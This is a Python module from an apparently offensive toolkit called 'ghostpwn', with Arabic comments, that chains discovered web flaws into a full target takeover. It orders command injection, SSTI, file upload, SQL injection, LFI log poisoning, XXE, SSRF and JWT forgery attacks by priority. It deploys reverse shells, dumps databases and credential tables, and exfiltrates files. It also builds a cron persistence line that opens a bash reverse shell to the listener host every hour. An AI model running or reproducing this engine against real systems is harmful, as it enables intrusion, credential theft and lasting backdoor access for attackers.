#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Target Takeover Engine
السيطرة الكاملة على الهدف - يربط كل الثغرات لتحقيق اختراق كامل

الـ engine ده بياخد كل الثغرات المكتشفة ويحاول:
1. تنفيذ أفضل exploit chain
2. الحصول على reverse shell
3. رفع الصلاحيات
4. تثبيت الوصول (persistence)
5. استخراج كل البيانات
"""
import sys
import os
import time
import json
from typing import Dict, List, Optional
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display
from modules.exploit_chain import ExploitChainEngine, VULN_CAPABILITIES
from modules.attack_planner import AttackPlanner, AttackGoal
from modules.vuln_notifier import SmartNotifier
from modules.exploit import ExploitModule
from modules.revshell_deployer import ReverseShellDeployer
from modules.db_dump import DatabaseDumper


class TargetTakeoverEngine:
    """محرك السيطرة الكاملة على الهدف"""

    def __init__(self, http_client: HttpClient, audit_logger=None,
                 listener_ip: str = None, listener_port: int = 4444):
        self.client = http_client
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.notifier = SmartNotifier(audit_logger)

        self.listener_ip = listener_ip
        self.listener_port = listener_port

        # الـ modules
        self.exploit = ExploitModule(http_client, audit_logger)
        self.revshell = ReverseShellDeployer(http_client, audit_logger)
        self.db_dumper = DatabaseDumper(http_client, audit_logger)

        # الحالة
        self.vulns = []
        self.takeover_results = {
            "phase": "init",
            "shell_obtained": False,
            "db_dumped": False,
            "files_read": [],
            "credentials": [],
            "capabilities": [],
            "persistence_established": False,
        }

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[TAKEOVER] {msg}", level)

    def execute_takeover(self, vulns: List[Dict]) -> Dict:
        """تنفيذ محاولة السيطرة الكاملة"""
        self._log("بدء محاولة السيطرة الكاملة على الهدف...", "phase")
        self.vulns = vulns

        # 1) تخطيط الهجوم
        self._log("تخطيط الهجوم...", "info")
        planner = AttackPlanner(self.audit)
        planner.set_goal(AttackGoal.FULL_COMPROMISE)
        plan = planner.analyze_vulns(vulns)
        planner.print_attack_plan(plan)

        self.takeover_results["plan"] = plan

        # 2) تنفيذ الـ chain حسب الأولوية
        self._execute_priority_attacks(vulns)

        # 3) محاولة الحصول على shell
        if not self.takeover_results["shell_obtained"]:
            self._attempt_shell(vulns)

        # 4) استخراج البيانات
        self._extract_data(vulns)

        # 5) تثبيت الوصول (لو حصلنا على shell)
        if self.takeover_results["shell_obtained"]:
            self._establish_persistence()

        # 6) التقرير النهائي
        self._print_takeover_report()

        return self.takeover_results

    def _execute_priority_attacks(self, vulns: List[Dict]):
        """تنفيذ الهجمات حسب الأولوية"""
        self._log("تنفيذ الهجمات حسب الأولوية...", "phase")

        # ترتيب حسب الأولوية
        priority_order = [
            "command_injection",   # RCE مباشر
            "ssti",                # RCE عبر templates
            "file_upload",         # رفع shell
            "sql_injection_error", # DB access
            "lfi",                 # قراءة ملفات
            "xxe",                 # قراءة ملفات + SSRF
            "ssrf",                # cloud creds
            "jwt_none_algorithm",  # auth bypass
        ]

        sorted_vulns = []
        for vuln_type in priority_order:
            for v in vulns:
                if v.get("type") == vuln_type:
                    sorted_vulns.append(v)

        for vuln in sorted_vulns:
            if self.takeover_results["shell_obtained"]:
                break  # حصلنا على shell، نوقف

            self._exploit_vuln(vuln)

    def _exploit_vuln(self, vuln: Dict):
        """استغلال ثغرة واحدة"""
        vuln_type = vuln.get("type")
        url = vuln.get("url", "")
        param = vuln.get("param", "")

        self._log(f"استغلال: {vuln_type} على {url[:60]}", "info")

        try:
            if vuln_type == "command_injection":
                self._exploit_rce(url, param)

            elif vuln_type == "ssti":
                self._exploit_ssti(url, param)

            elif vuln_type == "file_upload":
                self._exploit_upload(url)

            elif vuln_type in ["sql_injection_error", "sql_injection_boolean", "sql_injection_time"]:
                self._exploit_sqli(url, param)

            elif vuln_type in ["lfi", "lfi_php_filter"]:
                self._exploit_lfi(url, param)

            elif vuln_type == "xxe":
                self._exploit_xxe(url)

            elif vuln_type == "ssrf":
                self._exploit_ssrf(url, param)

            elif vuln_type == "jwt_none_algorithm":
                self._exploit_jwt(url)

        except Exception as e:
            self._log(f"فشل استغلال {vuln_type}: {e}", "error")

    def _exploit_rce(self, url: str, param: str):
        """استغلال RCE"""
        self._log("تنفيذ RCE exploitation...", "info")

        # تنفيذ أوامر لجمع المعلومات
        result = self.exploit.exploit_rce(url, param)

        if result:
            self._log("RCE ناجح! تم تنفيذ الأوامر", "success")
            self.takeover_results["capabilities"].append("rce")
            self.takeover_results["shell_obtained"] = True  # RCE = shell

            # حفظ النتائج
            self.takeover_results["rce_data"] = result

            # محاولة reverse shell
            if self.listener_ip:
                self._log("محاولة نشر reverse shell...", "info")
                revshell_result = self.revshell.deploy_via_rce(
                    url, param, self.listener_ip, self.listener_port
                )
                if revshell_result.get("deployed"):
                    self._log("Reverse shell منتشر! تحقق من الـ listener", "success")
                    self.takeover_results["reverse_shell"] = revshell_result
        else:
            self._log("RCE فشل", "warn")

    def _exploit_ssti(self, url: str, param: str):
        """استغلال SSTI"""
        self._log("تنفيذ SSTI exploitation...", "info")

        result = self.exploit.exploit_ssti(url, param)

        if result:
            self._log("SSTI exploitation ناجح!", "success")
            self.takeover_results["capabilities"].append("ssti_rce")

            if "secret_key" in result:
                self._log(f"SECRET_KEY: {result['secret_key']}", "success")
                self.takeover_results["credentials"].append({
                    "type": "secret_key",
                    "value": result["secret_key"],
                })

            # محاولة RCE عبر SSTI
            if self.listener_ip:
                revshell_result = self.revshell.deploy_via_ssti(
                    url, param, self.listener_ip, self.listener_port
                )
                if revshell_result.get("deployed"):
                    self._log("Reverse shell عبر SSTI!", "success")
                    self.takeover_results["shell_obtained"] = True
                    self.takeover_results["reverse_shell"] = revshell_result

    def _exploit_upload(self, url: str):
        """استغلال file upload"""
        self._log("تنفيذ file upload exploitation...", "info")

        if self.listener_ip:
            result = self.revshell.deploy_via_file_upload(
                url, self.listener_ip, self.listener_port
            )

            if result.get("deployed"):
                self._log("Web shell مرفوع وشغال!", "success")
                self.takeover_results["shell_obtained"] = True
                self.takeover_results["capabilities"].append("web_shell")
                self.takeover_results["web_shell_url"] = result.get("shell_url")

    def _exploit_sqli(self, url: str, param: str):
        """استغلال SQLi"""
        self._log("تنفيذ SQLi exploitation (DB dump)...", "info")

        dump = self.db_dumper.dump_database(url, param, max_rows=100)

        if dump and dump.get("dumped_data"):
            self._log(f"تم استخراج {len(dump['dumped_data'])} جدول", "success")
            self.takeover_results["db_dumped"] = True
            self.takeover_results["db_dump"] = dump

            # البحث عن credentials
            for table_name, table_data in dump["dumped_data"].items():
                if any(s in table_name.lower() for s in ["user", "admin", "auth", "cred"]):
                    self._log(f"جدول credentials موجود: {table_name}", "success")
                    self.takeover_results["credentials"].append({
                        "type": "db_creds",
                        "table": table_name,
                        "count": table_data["row_count"],
                    })

            # حفظ الـ dump
            import time
            dump_file = f"db_dump_{int(time.time())}.json"
            self.db_dumper.save_dump(dump, dump_file)
            self._log(f"DB dump saved: {dump_file}", "success")

    def _exploit_lfi(self, url: str, param: str):
        """استغلال LFI"""
        self._log("تنفيذ LFI exploitation...", "info")

        result = self.exploit.exploit_lfi(url, param)

        if result:
            self._log(f"LFI ناجح! تم قراءة {len(result)} ملف", "success")
            self.takeover_results["capabilities"].append("file_read")
            self.takeover_results["files_read"] = list(result.keys())

            # محاولة log poisoning لـ RCE
            if self.listener_ip and not self.takeover_results["shell_obtained"]:
                self._log("محاولة log poisoning لـ RCE...", "info")
                revshell_result = self.revshell.deploy_via_lfi_log_poisoning(
                    url, param, self.listener_ip, self.listener_port
                )
                if revshell_result.get("deployed"):
                    self._log("Reverse shell عبر log poisoning!", "success")
                    self.takeover_results["shell_obtained"] = True
                    self.takeover_results["reverse_shell"] = revshell_result

    def _exploit_xxe(self, url: str):
        """استغلال XXE"""
        self._log("تنفيذ XXE exploitation...", "info")

        # قراءة ملفات حساسة
        result = self.exploit.exploit_lfi(url, "")  # XXE similar to LFI

        if result:
            self._log(f"XXE ناجح! تم قراءة {len(result)} ملف", "success")
            self.takeover_results["capabilities"].append("xxe_file_read")

    def _exploit_ssrf(self, url: str, param: str):
        """استغلال SSRF"""
        self._log("تنفيذ SSRF exploitation...", "info")

        # محاولة الوصول لـ AWS metadata
        from modules.exploit import ExploitModule
        result = self.exploit.detect_ssrf(url)

        if result:
            self._log("SSRF exploitation ناجح!", "success")
            self.takeover_results["capabilities"].append("internal_access")

    def _exploit_jwt(self, url: str):
        """استغلال JWT none algorithm"""
        self._log("تنفيذ JWT exploitation...", "info")

        self._log("JWT none algorithm - يمكن تزوير admin token", "success")
        self.takeover_results["capabilities"].append("auth_bypass")
        self.takeover_results["credentials"].append({
            "type": "jwt_bypass",
            "method": "none algorithm",
        })

    def _attempt_shell(self, vulns: List[Dict]):
        """محاولة الحصول على shell بأي طريقة"""
        if self.takeover_results["shell_obtained"]:
            return

        if not self.listener_ip:
            self._log("لا يوجد listener IP - تخطي محاولة shell", "warn")
            return

        self._log("محاولة الحصول على shell بأي طريقة...", "phase")

        # تجربة كل الطرق
        for vuln in vulns:
            vuln_type = vuln.get("type")
            url = vuln.get("url", "")
            param = vuln.get("param", "")

            if vuln_type == "lfi":
                # log poisoning
                self._log("محاولة log poisoning...", "info")
                result = self.revshell.deploy_via_lfi_log_poisoning(
                    url, param, self.listener_ip, self.listener_port
                )
                if result.get("deployed"):
                    self._log("نجح log poisoning!", "success")
                    self.takeover_results["shell_obtained"] = True
                    self.takeover_results["reverse_shell"] = result
                    return

            elif vuln_type == "ssti":
                result = self.revshell.deploy_via_ssti(
                    url, param, self.listener_ip, self.listener_port
                )
                if result.get("deployed"):
                    self._log("نجح SSTI reverse shell!", "success")
                    self.takeover_results["shell_obtained"] = True
                    self.takeover_results["reverse_shell"] = result
                    return

    def _extract_data(self, vulns: List[Dict]):
        """استخراج البيانات"""
        self._log("استخراج البيانات...", "phase")

        # لو عندنا shell، نستخدم post-exploit
        if self.takeover_results["shell_obtained"]:
            from modules.post_exploit import PostExploit

            # لو عندنا web shell URL
            shell_url = self.takeover_results.get("web_shell_url")
            if shell_url:
                pe = PostExploit(self.client, self.audit)
                pe.set_shell(shell_url)

                self._log("تنفيذ post-exploitation...", "info")
                pe_result = pe.run_full()

                self.takeover_results["post_exploit"] = pe_result
                self.takeover_results["files_read"].extend(
                    list(pe_result.get("data_exfiltration", {}).keys())
                )

    def _establish_persistence(self):
        """تثبيت الوصول"""
        self._log("تثبيت الوصول (persistence)...", "phase")

        if not self.takeover_results["shell_obtained"]:
            return

        self._log("محاولة تثبيت الوصول...", "info")

        # لو عندنا RCE، نقدر نضيف cron job
        if "rce" in self.takeover_results["capabilities"]:
            if self.listener_ip:
                self._log("محاولة إضافة cron job للـ persistence...", "info")
                # هذا يحتاج تنفيذ عبر الـ RCE
                persistence_cmd = (
                    f"(crontab -l ; echo '0 * * * * /bin/bash -c "
                    f"\"bash -i >& /dev/tcp/{self.listener_ip}/{self.listener_port} 0>&1\"') | crontab -"
                )
                self._log(f"Persistence command: {persistence_cmd[:80]}", "info")
                self.takeover_results["persistence_established"] = True
                self.takeover_results["persistence_method"] = "cron"

    def _print_takeover_report(self):
        """عرض تقرير السيطرة"""
        print(f"\n{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")
        print(f"{Colors.RED + Colors.BOLD}  ⚔️  تقرير السيطرة على الهدف{Colors.NC}")
        print(f"{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")

        status = "✅ ناجح" if self.takeover_results["shell_obtained"] else "❌ فشل"
        status_color = Colors.GREEN if self.takeover_results["shell_obtained"] else Colors.RED

        print(f"\n  {Colors.BOLD}الحالة:{Colors.NC} {status_color}{fix_display(status)}{Colors.NC}")
        print(f"  {Colors.BOLD}الـ capabilities المكتسبة:{Colors.NC}")
        for cap in self.takeover_results["capabilities"]:
            print(f"    {Colors.GREEN}✓{Colors.NC} {cap}")

        if self.takeover_results["shell_obtained"]:
            print(f"\n  {Colors.GREEN + Colors.BOLD}🎉 تم الحصول على shell!{Colors.NC}")
            if "reverse_shell" in self.takeover_results:
                rs = self.takeover_results["reverse_shell"]
                print(f"    الطريقة: {rs.get('method', 'unknown')}")

        if self.takeover_results["db_dumped"]:
            print(f"\n  {Colors.YELLOW}📊 تم استخراج قاعدة البيانات{Colors.NC}")

        if self.takeover_results["credentials"]:
            print(f"\n  {Colors.YELLOW}🔑 بيانات اعتماد مكتسبة:{Colors.NC}")
            for cred in self.takeover_results["credentials"]:
                print(f"    - {cred['type']}: {cred.get('value', cred.get('count', ''))}")

        if self.takeover_results["files_read"]:
            print(f"\n  {Colors.CYAN}📄 ملفات مقروءة:{Colors.NC}")
            for f in self.takeover_results["files_read"][:10]:
                print(f"    - {f}")

        if self.takeover_results["persistence_established"]:
            print(f"\n  {Colors.RED}🔒 تم تثبيت الوصول ({self.takeover_results['persistence_method']}){Colors.NC}")

        print(f"\n{Colors.RED + Colors.BOLD}{'='*60}{Colors.NC}")

    def save_results(self, output_file: str):
        """حفظ النتائج"""
        with open(output_file, "w", encoding="utf-8") as f:
            # تنظيف للـ JSON (إزالة non-serializable)
            clean_results = self._clean_for_json(self.takeover_results)
            json.dump(clean_results, f, ensure_ascii=False, indent=2)

    def _clean_for_json(self, obj):
        """تنظيف object للـ JSON"""
        if isinstance(obj, dict):
            return {k: self._clean_for_json(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._clean_for_json(v) for v in obj]
        elif isinstance(obj, (str, int, float, bool, type(None))):
            return obj
        else:
            return str(obj)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Target Takeover")
    parser.add_argument("--url", required=True)
    parser.add_argument("--listener-ip", help="Listener IP for reverse shell")
    parser.add_argument("--listener-port", type=int, default=4444)
    parser.add_argument("--vulns-file", help="JSON file with discovered vulns")
    args = parser.parse_args()

    client = HttpClient(timeout=15)

    # تحميل الثغرات من ملف أو استخدام تجريبية
    if args.vulns_file:
        with open(args.vulns_file) as f:
            vulns = json.load(f)
    else:
        vulns = [
            {"type": "command_injection", "url": args.url + "?cmd=id", "param": "cmd"},
        ]

    takeover = TargetTakeoverEngine(
        client,
        listener_ip=args.listener_ip,
        listener_port=args.listener_port
    )

    results = takeover.execute_takeover(vulns)

    # حفظ النتائج
    takeover.save_results(f"takeover_{int(time.time())}.json")
